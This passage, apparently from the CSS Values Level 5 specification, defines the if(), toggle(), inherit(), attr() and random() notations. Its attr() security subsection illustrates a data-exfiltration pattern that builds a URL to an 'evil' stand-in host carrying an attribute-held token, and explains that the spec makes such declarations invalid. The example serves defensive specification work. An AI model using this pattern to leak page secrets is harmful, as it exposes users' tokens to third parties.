<first-valid()> = first-valid( <declaration-value># )
```
<a id="ref-for-invalid-at-computed-value-time"></a>

If none of the arguments represent a valid value for the property, the property is [invalid at computed-value time](#invalid-at-computed-value-time).

<a id="ref-for-funcdef-first-valid①"></a>

<a id="ref-for-whole-value①⑥"></a>

[first-valid()](#funcdef-first-valid) is a [\<whole-value\>](#whole-value).

> <strong data-conversion-semantic="issue">Issue</strong>
>
> <a id="issue-3679a886"></a> Should this have a different name? We didn’t quite decide on it during the resolution to add this.

<a id="ref-for-whole-value①⑦"></a>

<a id="ref-for-funcdef-first-valid②"></a>

<a id="ref-for-typedef-declaration-value⑥"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: Despite effectively taking [\<whole-value\>](#whole-value)s as its argument, [first-valid()](#funcdef-first-valid) is instead defined to take [\<declaration-value\>](https://www.w3.org/TR/css-syntax-3/#typedef-declaration-value)s because, by definition, it’s intended to be used in cases <em>where its values might be invalid for the declaration it’s in</em>. <a id="ref-for-typedef-declaration-value⑦"></a>\<declaration-value\> imposes no contextual validity constraints on what it matches, unlike <a id="ref-for-whole-value①⑧"></a>\<whole-value\>.

<a id="ref-for-funcdef-if①"></a>

### <a id="if-notation"></a>7.3.  Conditional Value Selection: the [if()](#funcdef-if) notation

<a id="ref-for-arbitrary-substitution-function①"></a>

<a id="ref-for-funcdef-if②"></a>

The <a id="funcdef-if"></a>if() notation is an [arbitrary substitution function](#arbitrary-substitution-function) that represents conditional values. Its argument consists of an ordered semi-colon–separated list of statements, each consisting of a condition followed by a colon followed by a value. An [if()](#funcdef-if) notation represents the value corresponding to the first condition in its argument list to be true; if no condition matches, then the <a id="ref-for-funcdef-if③"></a>if() notation represents an empty token stream.

<a id="ref-for-funcdef-if④"></a>

The [if()](#funcdef-if) notation syntax is defined as follows:

<a id="typedef-if"></a>

<a id="ref-for-funcdef-if⑤"></a>

<a id="ref-for-typedef-if-condition"></a>

<a id="ref-for-typedef-declaration-value⑧"></a>

<a id="ref-for-mult-opt⑤"></a>

<a id="ref-for-mult-zero-plus③"></a>

<a id="ref-for-typedef-if-condition①"></a>

<a id="ref-for-typedef-declaration-value⑨"></a>

<a id="ref-for-mult-opt⑥"></a>

<a id="ref-for-mult-opt⑦"></a>

<a id="typedef-if-condition"></a>

<a id="ref-for-typedef-if-condition②"></a>

<a id="ref-for-comb-one⑨⑨"></a>

<a id="typedef-if-test"></a>

<a id="ref-for-typedef-if-test"></a>

<a id="ref-for-typedef-supports-condition"></a>

<a id="ref-for-comb-one①⓪⓪"></a>

<a id="ref-for-typedef-ident②"></a>

<a id="ref-for-typedef-declaration-value①⓪"></a>

<a id="ref-for-comb-one①⓪①"></a>

<a id="ref-for-typedef-media-query"></a>

<a id="ref-for-comb-one①⓪②"></a>

<a id="ref-for-typedef-style-query"></a>

```text
<if()> = if( [ <if-condition> : <declaration-value>? ; ]*
             <if-condition> : <declaration-value>? ;? )
<if-condition> = <boolean-expr[ <if-test> ]> | else
<if-test> =
  supports( [ <supports-condition> | <ident> : <declaration-value> ] ) |
  media( <media-query> ) |
  style( <style-query> )
```
The <a id="valdef-if-else"></a>else keyword represents a condition that is always true.

<a id="ref-for-resolve-an-arbitrary-substitution-function"></a>

<a id="ref-for-typedef-declaration-value①①"></a>

<a id="ref-for-typedef-if-condition③"></a>

To <a id="resolve-an-if-function"></a>[resolve an if() function](#resolve-an-arbitrary-substitution-function), return the [\<declaration-value\>](https://www.w3.org/TR/css-syntax-3/#typedef-declaration-value)? associated with the first [\<if-condition\>](#typedef-if-condition) that is true; if none are true, return nothing (an empty token stream).

<a id="ref-for-at-ruledef-media①"></a>

<a id="ref-for-at-ruledef-supports②"></a>

<a id="ref-for-at-ruledef-container②"></a>

<a id="ref-for-funcdef-if⑥"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: Unlike using [@media](https://www.w3.org/TR/css-conditional-3/#at-ruledef-media)/[@supports](https://www.w3.org/TR/css-conditional-3/#at-ruledef-supports)/[@container](https://www.w3.org/TR/css-conditional-5/#at-ruledef-container) rules, which just ignore their contents when they’re false and let the cascade determine what values otherwise apply, declarations with [if()](#funcdef-if) do not roll back the cascade if the conditions are false; any fallback values must be provided inline.

<a id="ref-for-funcdef-toggle"></a>

### <a id="toggle-notation"></a>7.4.  Toggling Between Values: the [toggle()](#funcdef-toggle) notation

The <a id="funcdef-toggle"></a>toggle() expression allows descendant elements to cycle over a list of values instead of inheriting the same value.

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-43c760b5"></a> The following example makes `<em>` elements italic in general, but makes them normal if they’re inside something that’s italic:
>
> ```text
> em { font-style: toggle(italic, normal); }
> ```
<a id="ref-for-value-def-disc"></a>

<a id="ref-for-value-def-circle"></a>

<a id="ref-for-value-def-square"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-fa2213e4"></a> The following example cycles markers for nested lists, so that a top level list has [disc](https://drafts.csswg.org/css2/#value-def-disc)-shaped markers, but nested lists use [circle](https://drafts.csswg.org/css2/#value-def-circle), then [square](https://drafts.csswg.org/css2/#value-def-square), then box, and then repeat through the list of marker shapes, starting again (for the 5th list deep) with <a id="ref-for-value-def-disc①"></a>disc.
>
> ```text
> ul { list-style-type: toggle(disc, circle, square, box); }
> ```
<a id="ref-for-funcdef-toggle①"></a>

The syntax of the [toggle()](#funcdef-toggle) expression is:

<a id="typedef-toggle"></a>

<a id="ref-for-funcdef-toggle②"></a>

<a id="ref-for-whole-value①⑨"></a>

<a id="ref-for-mult-comma③"></a>

```text
<toggle()> = toggle( <whole-value># )
```
<a id="ref-for-funcdef-toggle③"></a>

<a id="ref-for-whole-value②⓪"></a>

<a id="ref-for-funcdef-attr②"></a>

<a id="ref-for-funcdef-calc③"></a>

The [toggle()](#funcdef-toggle) notation is a [\<whole-value\>](#whole-value). However, it is not allowed to be nested, nor may it contain [attr()](#funcdef-attr) or [calc()](https://www.w3.org/TR/css-values-4/#funcdef-calc) notations; declarations containing such constructs are invalid.

<a id="ref-for-funcdef-toggle④"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-967482c4"></a> The following [toggle()](#funcdef-toggle) examples are all invalid:
>
> ```text
> background-position: 10px toggle(50px, 100px);
> /* toggle() must be the sole value of the property */
> 
> list-style-type: toggle(disc, 50px);
> /* 50px isn’t a valid value of 'list-style-type' */
> ```
<a id="ref-for-funcdef-toggle⑤"></a>

<a id="ref-for-inherited-value"></a>

To determine the computed value of [toggle()](#funcdef-toggle), first evaluate each argument as if it were the sole value of the property in which <a id="ref-for-funcdef-toggle⑥"></a>toggle() is placed to determine the computed value that each represents, called <var>C<sub>n</sub></var> for the <var>n</var>-th argument to <a id="ref-for-funcdef-toggle⑦"></a>toggle(). Then, compare the property’s [inherited value](https://www.w3.org/TR/css-cascade-5/#inherited-value) with each <var>C<sub>n</sub></var>. For the earliest <var>C<sub>n</sub></var> that matches the <a id="ref-for-inherited-value①"></a>inherited value, the computed value of <a id="ref-for-funcdef-toggle⑧"></a>toggle() is <var>C<sub>n+1</sub></var>. If the match was the last argument in the list, or there was no match, the computed value of <a id="ref-for-funcdef-toggle⑨"></a>toggle() is the computed value that the first argument represents.

<a id="ref-for-funcdef-toggle①⓪"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: This means that repeating values in a [toggle()](#funcdef-toggle) short-circuits the list. For example toggle(1em, 2em, 1em, 4em) will be equivalent to toggle(1em, 2em).

<a id="ref-for-funcdef-toggle①①"></a>

<a id="ref-for-valdef-all-inherit"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: That [toggle()](#funcdef-toggle) explicitly looks at the computed value of the parent, so it works even on non-inherited properties. This is similar to the [inherit](https://www.w3.org/TR/css-cascade-5/#valdef-all-inherit) keyword, which works even on non-inherited properties.

<a id="ref-for-computed-value①①"></a>

<a id="ref-for-propdef-background-position⑦"></a>

<a id="ref-for-propdef-background-position⑧"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: That the [computed value](https://www.w3.org/TR/css-cascade-5/#computed-value) of a property is an abstract set of values, not a particular serialization [\[CSS21\]](#biblio-css21), so comparison between computed values should always be unambiguous and have the expected result. For example, a Level 2 [background-position](https://drafts.csswg.org/css2/#propdef-background-position) computed value is just two offsets, each represented as an absolute length or a percentage, so the declarations [background-position: top center](https://www.w3.org/TR/css-backgrounds-3/#propdef-background-position) and <a id="ref-for-propdef-background-position⑨"></a>background-position: 50% 0% produce identical computed values. If the "Computed Value" line of a property definition seems to define something ambiguous or overly strict, please [provide feedback](#sotd) so we can fix it.

<a id="ref-for-funcdef-toggle①②"></a>

<a id="ref-for-shorthand-property"></a>

If [toggle()](#funcdef-toggle) is used on a [shorthand property](https://www.w3.org/TR/css-cascade-5/#shorthand-property), it sets each of its longhands to a <a id="ref-for-funcdef-toggle①③"></a>toggle() value with arguments corresponding to what the longhand would have received had each of the original <a id="ref-for-funcdef-toggle①④"></a>toggle() arguments been the sole value of the <a id="ref-for-shorthand-property①"></a>shorthand.

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-4bc8989d"></a> For example, the following shorthand declaration:
>
> ```text
> margin: toggle(1px 2px, 4px, 1px 5px 4px);
> ```
>
> is equivalent to the following longhand declarations:
>
> ```text
> margin-top:    toggle(1px, 4px, 1px);
> margin-right:  toggle(2px, 4px, 5px);
> margin-bottom: toggle(1px, 4px, 4px);
> margin-left:   toggle(2px, 4px, 5px);
> ```
>
> Note that, since 1px appears twice in the top margin and 4px appears twice in bottom margin, they will cycle between only two values while the left and right margins cycle through three. In other words, the declarations above will yield the same computed values as the longhand declarations below:
>
> ```text
> margin-top:    toggle(1px, 4px);
> margin-right:  toggle(2px, 4px, 5px);
> margin-bottom: toggle(1px, 4px);
> margin-left:   toggle(2px, 4px, 5px);
> ```
>
> which may not be what was intended.

<a id="ref-for-funcdef-var④"></a>

### <a id="var-notation"></a>7.5.  Custom Property References: the [var()](https://www.w3.org/TR/css-variables-1/#funcdef-var) notation

<a id="ref-for-funcdef-var⑤"></a>

<a id="ref-for-custom-property"></a>

The [var()](https://www.w3.org/TR/css-variables-1/#funcdef-var) notation substitutes the value of a [custom property](https://www.w3.org/TR/css-variables-1/#custom-property), see the [CSS Custom Properties for Cascading Variables Module](https://www.w3.org/TR/css-variables/#using-variables). [\[CSS-VARIABLES\]](https://www.w3.org/TR/2024/WD-css-values-5-20241111/#biblio-css-variables)

<a id="ref-for-funcdef-inherit"></a>

### <a id="inherit-notation"></a>7.6.  Inherited Value References: the [inherit()](#funcdef-inherit) notation

<a id="ref-for-valdef-all-inherit①"></a>

<a id="ref-for-functional-notation⑧"></a>

<a id="ref-for-computed-value①②"></a>

<a id="ref-for-guaranteed-invalid-value②"></a>

Like the [inherit](https://www.w3.org/TR/css-cascade-5/#valdef-all-inherit) keyword, the <a id="funcdef-inherit"></a>inherit() [functional notation](https://www.w3.org/TR/css-values-4/#functional-notation) resolves to the [computed value](https://www.w3.org/TR/css-cascade-5/#computed-value) of a property on the parent. Rather than resolving to the value of the same property, however, it resolves to the tokenized <a id="ref-for-computed-value①③"></a>computed value of the property specified as its first argument. Its second argument, if present, is used as a fallback in case the first argument resolves to the [guaranteed-invalid value](https://www.w3.org/TR/css-variables-1/#guaranteed-invalid-value).

<a id="ref-for-funcdef-inherit①"></a>

<a id="ref-for-arbitrary-substitution-function②"></a>

[inherit()](#funcdef-inherit) is an [arbitrary substitution function](#arbitrary-substitution-function) whose syntax is defined as:

<a id="typedef-inherit"></a>

<a id="ref-for-funcdef-inherit②"></a>

<a id="ref-for-typedef-custom-property-name"></a>

<a id="ref-for-comb-comma①⑨"></a>

<a id="ref-for-typedef-declaration-value①②"></a>

<a id="ref-for-mult-opt⑧"></a>

```text
<inherit()> = inherit( <custom-property-name>, <declaration-value>? )
```
<a id="ref-for-resolve-an-arbitrary-substitution-function①"></a>

<a id="ref-for-inherited-value②"></a>

<a id="ref-for-custom-property①"></a>

To <a id="resolve-an-inherit-function"></a>[resolve an inherit() function](#resolve-an-arbitrary-substitution-function), return the [inherited value](https://www.w3.org/TR/css-cascade-5/#inherited-value) of the [custom property](https://www.w3.org/TR/css-variables-1/#custom-property) specified by the first argument, and (if specified) the fallback specified by the second argument.

<a id="ref-for-funcdef-inherit③"></a>

<a id="ref-for-computed-value①④"></a>

<a id="ref-for-used-value②"></a>

<a id="ref-for-dom-window-getcomputedstyle"></a>

<a id="ref-for-valdef-width-auto"></a>

<a id="ref-for-length-value⑥"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: Future levels of CSS may allow specifying standard CSS properties in [inherit()](#funcdef-inherit); however because the tokenization of [computed values](https://www.w3.org/TR/css-cascade-5/#computed-value) is not fully standardized for all CSS properties, this feature is deferred from Level 5. Note that the <a id="ref-for-computed-value①⑤"></a>computed value differs from the [used value](https://www.w3.org/TR/css-cascade-5/#used-value), and is not always the resolved value returned by <code><a href="https://www.w3.org/TR/cssom-1/#dom-window-getcomputedstyle">getComputedStyle()</a></code>; thus even if inherit(width) were allowed, it would frequently return the keyword [auto](https://www.w3.org/TR/css-sizing-3/#valdef-width-auto), not the used [\<length\>](https://www.w3.org/TR/css-values-4/#length-value).

<a id="ref-for-funcdef-attr③"></a>

### <a id="attr-notation"></a>7.7.  Attribute References: the [attr()](#funcdef-attr) notation

<a id="ref-for-concept-attribute"></a>

<a id="ref-for-concept-element"></a>

<a id="ref-for-funcdef-var⑥"></a>

<a id="ref-for-custom-property②"></a>

The <a id="funcdef-attr"></a>attr() function substitutes the value of an [attribute](https://dom.spec.whatwg.org/#concept-attribute) on an [element](https://dom.spec.whatwg.org/#concept-element) into a property, similar to how the [var()](https://www.w3.org/TR/css-variables-1/#funcdef-var) function substitutes a [custom property](https://www.w3.org/TR/css-variables-1/#custom-property) value into a function.

<a id="ref-for-typedef-attr-name"></a>

<a id="ref-for-typedef-syntax①③"></a>

<a id="ref-for-mult-opt⑨"></a>

<a id="ref-for-comb-comma②⓪"></a>

<a id="ref-for-typedef-declaration-value①③"></a>

<a id="ref-for-mult-opt①⓪"></a>

<a id="typedef-attr-name"></a>

<a id="ref-for-typedef-ident-token"></a>

<a id="ref-for-mult-opt①①"></a>

<a id="ref-for-typedef-ident-token①"></a>

```text
attr() = attr( <attr-name> <syntax>? , <declaration-value>?)

<attr-name> = [ <ident-token> '|' ]? <ident-token>
```
<a id="ref-for-funcdef-attr④"></a>

The arguments of [attr()](#funcdef-attr) are:

<a id="ref-for-typedef-attr-name①"></a>

[\<attr-name\>](#typedef-attr-name)

Gives the name of the attribute being referenced, similar to \<wq-name\> (from [\[SELECTORS-3\]](#biblio-selectors-3)) but without the possibility of a wildcard prefix.

<a id="ref-for-attribute-selector"></a>

<a id="ref-for-typedef-attr-name②"></a>

If no namespace is specified (just an identifier is given, like attr(foo)), the null namespace is implied. (This is usually what’s desired, as namespaced attributes are rare. In particular, HTML and SVG do not contain namespaced attributes.) As with [attribute selectors](https://www.w3.org/TR/selectors-4/#attribute-selector), the case-sensitivity of [\<attr-name\>](#typedef-attr-name) depends on the document language.

<a id="ref-for-funcdef-attr⑤"></a>

<a id="ref-for-originating-element"></a>

If [attr()](#funcdef-attr) is used in a property applied to an element, it references the attribute of the given name on that element; if applied to a pseudo-element, the attribute is looked up on the pseudo-element’s [originating element](https://www.w3.org/TR/selectors-4/#originating-element).

<a id="ref-for-typedef-syntax①④"></a>

[\<syntax\>](#typedef-syntax)

<a id="ref-for-css-parse-something-according-to-a-css-grammar④"></a>

Specifies how the attribute value is [parsed](https://www.w3.org/TR/css-syntax-3/#css-parse-something-according-to-a-css-grammar) into a CSS value. Values that fail to parse according to the syntax trigger fallback.

<a id="ref-for-typedef-syntax①⑤"></a>

Omitting the [\<syntax\>](#typedef-syntax) argument causes the attribute’s literal value to be treated as the value of a CSS string, with no CSS parsing performed at all (including CSS escapes, whitespace removal, comments, etc).

<a id="ref-for-x②"></a>

<a id="ref-for-string-value⑥"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: This is different from specifying a syntax of [\*](https://www.w3.org/TR/selectors-3/#x), which still triggers CSS parsing (but with no requirements placed on it beyond that it parse validly), and which substitutes the result of that parsing directly, rather than as a [\<string\>](https://www.w3.org/TR/css-values-4/#string-value) value.

<a id="ref-for-typedef-declaration-value①④"></a>

[\<declaration-value\>](https://www.w3.org/TR/css-syntax-3/#typedef-declaration-value)

<a id="ref-for-funcdef-attr⑥"></a>

Specifies a fallback value for the [attr()](#funcdef-attr), which will be substituted instead of the attribute’s value if the attribute is missing or fails to parse as the specified type.

<a id="ref-for-typedef-syntax①⑥"></a>

<a id="ref-for-guaranteed-invalid-value③"></a>

If the [\<syntax\>](#typedef-syntax) argument is omitted, the fallback defaults to the empty string if omitted; otherwise, it defaults to the [guaranteed-invalid value](https://www.w3.org/TR/css-variables-1/#guaranteed-invalid-value) if omitted.

<a id="ref-for-funcdef-attr⑦"></a>

<a id="ref-for-substitute-an-attr"></a>

If a property contains one or more [attr()](#funcdef-attr) functions, and those functions are syntactically valid, the entire property’s grammar must be assumed to be valid at parse time. It is only syntax-checked at computed-value time, after <a id="ref-for-funcdef-attr⑧"></a>attr() functions have been [substituted](https://www.w3.org/TR/css-values-5/#substitute-an-attr).

<a id="ref-for-propdef-width②"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note that the default value need not be of the type given. For instance, if the type required of the attribute by the author is \<number px\>, the default could still be auto, like in [width: attr(size \<number px\>, auto);](https://www.w3.org/TR/css-sizing-3/#propdef-width).

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-baff44a7"></a> This example shows the use of attr() to visually illustrate data in an XML file:
>
> ```text
> <stock>
>   <wood length="12"/>
>   <wood length="5"/>
>   <metal length="19"/>
>   <wood length="4"/>
> </stock>
> 
> stock::before {
>   display: block;
>   content: "To scale, the lengths of materials in stock are:";
> }
> stock > * {
>   display: block;
>   width: attr(length <number em>, 0px);
>   height: 1em;
>   border: solid thin;
>   margin: 0.5em;
> }
> wood {
>   background: orange url(wood.png);
> }
> metal {
>   background: silver url(metal.png);
> }
> ```
<a id="ref-for-funcdef-attr⑨"></a>

#### <a id="attr-substitution"></a>7.7.1.  Attribute Value Substitution: the [attr()](#funcdef-attr) notation

<a id="ref-for-funcdef-attr①⓪"></a>

<a id="ref-for-arbitrary-substitution-function③"></a>

<a id="ref-for-funcdef-var⑦"></a>

<a id="ref-for-computed-value①⑥"></a>

<a id="ref-for-guaranteed-invalid-value④"></a>

<a id="ref-for-invalid-at-computed-value-time①"></a>

[attr()](#funcdef-attr) is an [arbitrary substitution function](#arbitrary-substitution-function), similar to [var()](https://www.w3.org/TR/css-variables-1/#funcdef-var), and so is replaced with the value it represents (if possible) at [computed value](https://www.w3.org/TR/css-cascade-5/#computed-value) time; otherwise, it’s replaced with the [guaranteed-invalid value](https://www.w3.org/TR/css-variables-1/#guaranteed-invalid-value), which will make its declaration [invalid at computed-value time](#invalid-at-computed-value-time).

<a id="ref-for-resolve-an-arbitrary-substitution-function②"></a>

To <a id="resolve-an-attr-function"></a>[resolve an attr() function](#resolve-an-arbitrary-substitution-function):

1.  <a id="ref-for-funcdef-attr①①"></a>

    <a id="ref-for-typedef-syntax①⑦"></a>

    <a id="ref-for-typedef-declaration-value①⑤"></a>

    <a id="ref-for-guaranteed-invalid-value⑤"></a>

    Let <var>el</var> be the element that the style containing the [attr()](#funcdef-attr) function is being applied to. Let <var>attr name</var> be the attribute name specified in the function. Let <var>syntax</var> be the [\<syntax\>](#typedef-syntax) specified in the function, or null if it was omitted. Let <var>fallback</var> be the [\<declaration-value\>](https://www.w3.org/TR/css-syntax-3/#typedef-declaration-value)? argument specified in the function, or the [guaranteed-invalid value](https://www.w3.org/TR/css-variables-1/#guaranteed-invalid-value) if it was omitted.

2.  <a id="ref-for-guaranteed-invalid-value⑥"></a>

    If there is no attribute named <var>attr name</var> on <var>el</var>, return the [guaranteed-invalid value](https://www.w3.org/TR/css-variables-1/#guaranteed-invalid-value) and <var>fallback</var>. Otherwise, let <var>attr value</var> be that attribute’s value.

3.  <a id="ref-for-string-value⑦"></a>

    If <var>syntax</var> is null, return a CSS [\<string\>](https://www.w3.org/TR/css-values-4/#string-value) whose value is <var>attr value</var>.

    > <strong data-conversion-semantic="note">Note</strong>
    >
    > Note: No parsing or modification of any kind is performed on the value.

4.  <a id="ref-for-parse-with-a-syntax①"></a>

    [Parse with a \<syntax\>](#parse-with-a-syntax) <var>attr value</var>, with <var>syntax</var> and <var>el</var>. Return the result and <var>fallback</var>.

#### <a id="attr-security"></a>7.7.2.  Security

<a id="ref-for-funcdef-attr①②"></a>

An [attr()](#funcdef-attr) function can reference attributes that were never intended by the page to be used for styling, and might contain sensitive information (for example, a security token used by scripts on the page).

<a id="ref-for-funcdef-attr①③"></a>

In general, this is fine. It is difficult to use [attr()](#funcdef-attr) to extract information from a page and send it to a hostile party, in most circumstances. The exception to this is URLs. If a URL can be constructed with the value of an arbitrary attribute, purely from CSS, it can easily send any information stored in attributes to a hostile party, if 3rd-party CSS is allowed at all.

<a id="ref-for-funcdef-attr①④"></a>

<a id="ref-for-attr-taint"></a>

<a id="ref-for-registered-custom-property②"></a>

<a id="ref-for-substitute-a-var"></a>

To guard against this, the values produced by an [attr()](#funcdef-attr) are considered <a id="attr-taint"></a>attr()-tainted, as are functions that contain an [attr()-tainted](#attr-taint) value. [Registered custom properties](https://www.w3.org/TR/css-properties-values-api-1/#registered-custom-property) containing <a id="ref-for-funcdef-attr①⑤"></a>attr() maintain the <a id="ref-for-attr-taint①"></a>attr()-taint on their <a id="ref-for-attr-taint②"></a>attr()-tainted values across [var() substitution](https://www.w3.org/TR/css-variables-1/#substitute-a-var).

<a id="ref-for-attr-taint③"></a>

<a id="ref-for-url-value③"></a>

<a id="ref-for-invalid-at-computed-value-time②"></a>

Using an [attr()-tainted](#attr-taint) value as or in a [\<url\>](https://www.w3.org/TR/css-values-4/#url-value) makes a declaration [invalid at computed-value time](#invalid-at-computed-value-time).

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-1628840b"></a> For example, all of the following are invalid:
>
> - <a id="ref-for-propdef-background-image"></a>
>
>   [background-image: src(attr(foo));](https://www.w3.org/TR/css-backgrounds-3/#propdef-background-image) - can’t use it directly.
>
> - <a id="ref-for-propdef-background-image①"></a>
>
>   <a id="ref-for-url-value④"></a>
>
>   [background-image: image(attr(foo))](https://www.w3.org/TR/css-backgrounds-3/#propdef-background-image) - can’t use it in other [\<url\>](https://www.w3.org/TR/css-values-4/#url-value)-taking functions.
>
> - <a id="ref-for-propdef-background-image②"></a>
>
>   [background-image&#x3A; src(string("http&#x3A;&#x2F;&#x2F;example&#x2E;com&#x2F;evil?token=" attr(foo)))](https://www.w3.org/TR/css-backgrounds-3/#propdef-background-image) - can’t "launder" it thru another function&#x2E;
>
> - <a id="ref-for-registered-custom-property③"></a>
>
>   --foo: attr(foo); background-image(src(var(--foo))) (assuming that --foo is a [registered custom property](https://www.w3.org/TR/css-properties-values-api-1/#registered-custom-property) with string syntax) - can’t launder the value thru another property, either.
>
> <a id="ref-for-funcdef-attr①⑥"></a>
>
> However, using [attr()](#funcdef-attr) for other purposes is fine, even if the usage is <em>near</em> a url:
>
> - <a id="ref-for-propdef-background-image③"></a>
>
>   <a id="ref-for-funcdef-attr①⑦"></a>
>
>   <a id="ref-for-url-value⑤"></a>
>
>   <a id="ref-for-attr-taint④"></a>
>
>   [background-image: image("foo.jpg", attr(bgcolor \<color\>))](https://www.w3.org/TR/css-backgrounds-3/#propdef-background-image) is fine; the [attr()](#funcdef-attr) is providing a fallback color, and the [\<url\>](https://www.w3.org/TR/css-values-4/#url-value) isn’t [attr()-tainted](#attr-taint).

<a id="ref-for-funcdef-attr①⑧"></a>

<a id="ref-for-registered-custom-property④"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: Implementing this restriction requires tracking a dirty bit on values constructed from [attr()](#funcdef-attr) values, since they can be fully resolved into a string via [registered custom properties](https://www.w3.org/TR/css-properties-values-api-1/#registered-custom-property), so you can’t rely on just examining the value expression. Note that non-string types can even trigger this, via functions like string() that can stringify other types of values: --foo: attr(foo number); background-image: src(string(var(--foo))) needs to be invalid as well.

## <a id="randomness"></a>8.  Generating Random Values

It is often useful to incorporate some degree of "randomness" to a design, either to make repeated elements on a page feel less static and identical, or just to add a bit of "flair" to a page without being distracting.

<a id="ref-for-funcdef-random"></a>

<a id="ref-for-funcdef-random-item①"></a>

The [random()](#funcdef-random) and [random-item()](#funcdef-random-item) functions (the <a id="css-random-functions"></a>random functions) allow authors to incorporate randomness into their page, while keeping this randomness predictable from a design perspective, letting authors decide whether a random value should be reused in several places or be unique between instances.

<a id="ref-for-css-random-functions"></a>

The exact random-number generation method is UA-defined. It <em>should</em> be the case that two distinct random values have no easily-detectable correlation, but this specification intentionally does not specify what that means in terms of cryptographic strength. Authors <em>must not</em> rely on [random functions](#css-random-functions) for any purposes that depend on quality cryptography.

<a id="ref-for-funcdef-random①"></a>

### <a id="random"></a>8.1.  Generating a Random Numeric Value: the [random()](#funcdef-random) function

<a id="ref-for-math-function⑦"></a>

The <a id="funcdef-random"></a>random() function is a [math function](https://www.w3.org/TR/css-values-4/#math-function) that represents a random value between a minimum and maximum value, drawn from a uniform distribution, optionally limiting the possible values to a step between those limits:

<a id="ref-for-typedef-random-caching-options①"></a>

<a id="ref-for-mult-opt①②"></a>

<a id="ref-for-comb-comma②①"></a>

<a id="ref-for-typedef-calc-sum①③"></a>

<a id="ref-for-comb-comma②②"></a>

<a id="ref-for-typedef-calc-sum①④"></a>

<a id="ref-for-comb-comma②③"></a>

<a id="ref-for-typedef-calc-sum①⑤"></a>

<a id="ref-for-mult-opt①③"></a>

<a id="typedef-random-caching-options"></a>

<a id="ref-for-typedef-random-caching-options②"></a>

<a id="ref-for-typedef-dashed-ident"></a>

<a id="ref-for-comb-any"></a>

```text
<random()> = random( <random-caching-options>? , <calc-sum>, <calc-sum>, [by <calc-sum>]? )

<random-caching-options> = <dashed-ident> || per-element
```
Its arguments are:

<a id="ref-for-typedef-random-caching-options③"></a>

[\<random-caching-options\>](#typedef-random-caching-options)

<a id="ref-for-typedef-random-caching-options④"></a>

<a id="ref-for-funcdef-random②"></a>

The optional [\<random-caching-options\>](#typedef-random-caching-options) provides some control over whether a given [random()](#funcdef-random) function resolves similarly or differently to other <a id="ref-for-funcdef-random③"></a>random()s on the page. See [§ 8.3 Generating/Caching Random Values: the \<random-caching-options\> value](#random-caching) for details.

<a id="ref-for-funcdef-random④"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> By default, [random()](#funcdef-random) resolves to a single value, shared by all elements using that style, and two <a id="ref-for-funcdef-random⑤"></a>random() functions with identical arguments will resolve to the same random value.
>
> <a id="ref-for-typedef-dashed-ident①"></a>
>
> <a id="ref-for-funcdef-random⑥"></a>
>
> Providing a [\<dashed-ident\>](https://www.w3.org/TR/css-values-4/#typedef-dashed-ident) does nothing, but can make the argument lists distinct between two or more otherwise-identical [random()](#funcdef-random) functions, so they’ll generate distinct values.
>
> <a id="ref-for-funcdef-random⑦"></a>
>
> The per-element keyword causes the [random()](#funcdef-random) function to generate a different value <em>on each element</em> the function is applied to, rather than resolving to a single value per usage in the stylesheet.

<a id="ref-for-typedef-calc-sum①⑥"></a>

[\<calc-sum\>](https://www.w3.org/TR/css-values-4/#typedef-calc-sum), <a id="ref-for-typedef-calc-sum①⑦"></a>\<calc-sum\>

<a id="ref-for-calc-calculation⑦"></a>

The two required [calculations](https://www.w3.org/TR/css-values-4/#calc-calculation) specify the minimum and maximum value the function can resolve to. Both limits are inclusive (the result can be the min or the max).

If the maximum value is less than the minimum value, it behaves as if it’s equal to the minimum value.

<a id="ref-for-length-value⑦"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-84ddc1e3"></a> For example, random(100px, 300px) will resolve to a random [\<length\>](https://www.w3.org/TR/css-values-4/#length-value) between 100px and 300px: it might be 100px, 300px, or any value between them like 234.5px.

by \<calc-sum\>

The final optional argument specifies a step value: the values the function can resolve to are further restricted to the form `min + (N * step)`, where N is a non-negative integer chosen uniformly randomly from the possible values that result in an in-range value.

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-1401de84"></a> For example, random(100px, 300px, by 50px) can only resolve to 100px, 150px, 200px, 250px, or 300px; it will never return a value like 120px.
>
> While the minimum value is always a possible result, the maximum value isn’t always, if it’s not also a multiple of the step from the minimum. For example, in random(100px, 300px, by 30px), the largest possible value it can resolve to is 280px, 6 steps from the minimum value.
>
> Note that rounding issues might have an effect here: in random(100px, 200px, by 100px / 3) you’ll definitely get three possible values (100px, and approximately 133.33px and 166.67px), but whether 200px is possible depends on rounding precision. To be safe, you can put the maximum value <em>slightly above</em> where you expect the final step to land, like random(100px, 201px, by 100px / 3).

<a id="ref-for-funcdef-round"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-fd41058f"></a> As explained in the definition of [round()](https://www.w3.org/TR/css-values-4/#funcdef-round), CSS has no "natural" precision for values, but the step value can be used to assign one.
>
> For example, random(100px, 500px, by 1px) restricts it to resolving only to whole px values; random(1, 10, by 1) is restricted to resolving only to integers; etc.

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: The definition of the step <em>does not</em> allow for naively generating a random value in the range and then rounding it to the nearest step value, as that can result in the values not appearing with the same weights. For example, random(100px, 200px, by 50px) has to generate the three possible values each with a 1/3 chance; a naive rounding-based method will instead incorrectly generate 150px twice as often as the boundary values.

<a id="ref-for-calc-calculation⑧"></a>

<a id="ref-for-number-value②⓪"></a>

<a id="ref-for-typedef-dimension②"></a>

